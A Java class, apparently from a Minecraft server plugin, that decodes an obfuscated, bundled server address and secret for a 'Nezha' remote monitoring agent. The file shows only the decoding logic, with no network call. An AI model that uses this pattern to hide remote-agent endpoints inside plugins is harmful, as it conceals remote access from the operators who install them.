package com.example.essentialsx;

import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

/** Reversible build-time obfuscation, not credential encryption or protection. */
final class EmbeddedNezhaConfig {
    private static final String RESOURCE = "/ceshisonz-nezha-defaults.bin";
    private static final byte[] MAGIC = {'C', 'Z', 'N', '1'};
    private static final byte[] CONTEXT = "ceshisonz-builtin-v1".getBytes(StandardCharsets.US_ASCII);
    private static final int SALT_LENGTH = 16;
    private static final int MAX_VALUE_BYTES = 1024;
    private static final int MAX_RESOURCE_BYTES = 4096;

    private EmbeddedNezhaConfig() {}

    static final class Credentials {
        final String server;
        final String secret;

        Credentials(String server, String secret) {
            this.server = server;
            this.secret = secret;
        }
    }

    static final class IncompleteCredentialsException extends IOException {
        IncompleteCredentialsException() {
            super("Both explicit Nezha settings are required");
        }
    }

    static Credentials select(String server, String secret) throws IOException {
        if ((server != null && !server.isBlank()) || (secret != null && !secret.isBlank())) {
            return select(server, secret, null);
        }
        try (InputStream in = EmbeddedNezhaConfig.class.getResourceAsStream(RESOURCE)) {
            if (in == null) return null;
            return select(server, secret, in.readNBytes(MAX_RESOURCE_BYTES + 1));
        }
    }

    // Separate overload allows CI to check defaults and override handling with dummy values.
    static Credentials select(String server, String secret, byte[] embedded) throws IOException {
        boolean hasServer = server != null && !server.isBlank();
        boolean hasSecret = secret != null && !secret.isBlank();
        if (hasServer || hasSecret) {
            // Do not send the embedded secret to a different, partially configured server.
            if (!hasServer || !hasSecret) throw new IncompleteCredentialsException();
            return new Credentials(server.trim(), secret.trim());
        }
        if (embedded == null) return null;
        return decode(embedded);
    }

    private static Credentials decode(byte[] data) throws IOException {
        if (data.length < MAGIC.length + SALT_LENGTH + 4 || data.length > MAX_RESOURCE_BYTES) {
            throw new IOException("Invalid embedded Nezha settings");
        }
        for (int i = 0; i < MAGIC.length; i++) {
            if (data[i] != MAGIC[i]) throw new IOException("Invalid embedded Nezha settings");
        }
        byte[] salt = Arrays.copyOfRange(data, MAGIC.length, MAGIC.length + SALT_LENGTH);
        byte[] plain = new byte[data.length - MAGIC.length - SALT_LENGTH];
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            for (int offset = 0; offset < plain.length; offset += 32) {
                digest.update(CONTEXT);
                digest.update(salt);
                digest.update(ByteBuffer.allocate(4).putInt(offset / 32).array());
                byte[] mask = digest.digest();
                int count = Math.min(mask.length, plain.length - offset);
                for (int i = 0; i < count; i++) {
                    plain[offset + i] = (byte) (data[MAGIC.length + SALT_LENGTH + offset + i] ^ mask[i]);
                }
            }
            ByteBuffer payload = ByteBuffer.wrap(plain);
            int serverLength = Short.toUnsignedInt(payload.getShort());
            if (serverLength < 1 || serverLength > MAX_VALUE_BYTES || payload.remaining() < serverLength + 2) {
                throw new IOException("Invalid embedded Nezha settings");
            }
            byte[] serverBytes = new byte[serverLength];
            payload.get(serverBytes);
            int secretLength = Short.toUnsignedInt(payload.getShort());
            if (secretLength < 1 || secretLength > MAX_VALUE_BYTES || payload.remaining() != secretLength) {
                Arrays.fill(serverBytes, (byte) 0);
                throw new IOException("Invalid embedded Nezha settings");
            }
            byte[] secretBytes = new byte[secretLength];
            payload.get(secretBytes);
            String server = new String(serverBytes, StandardCharsets.UTF_8);
            String secret = new String(secretBytes, StandardCharsets.UTF_8);
            Arrays.fill(serverBytes, (byte) 0);
            Arrays.fill(secretBytes, (byte) 0);
            if (server.isBlank() || secret.isBlank() || containsLineBreak(server) || containsLineBreak(secret)) {
                throw new IOException("Invalid embedded Nezha settings");
            }
            return new Credentials(server, secret);
        } catch (NoSuchAlgorithmException error) {
            throw new IOException("SHA-256 is unavailable", error);
        } finally {
            Arrays.fill(plain, (byte) 0);
        }
    }

    private static boolean containsLineBreak(String value) {
        return value.indexOf('\0') >= 0 || value.indexOf('\r') >= 0 || value.indexOf('\n') >= 0;
    }
}
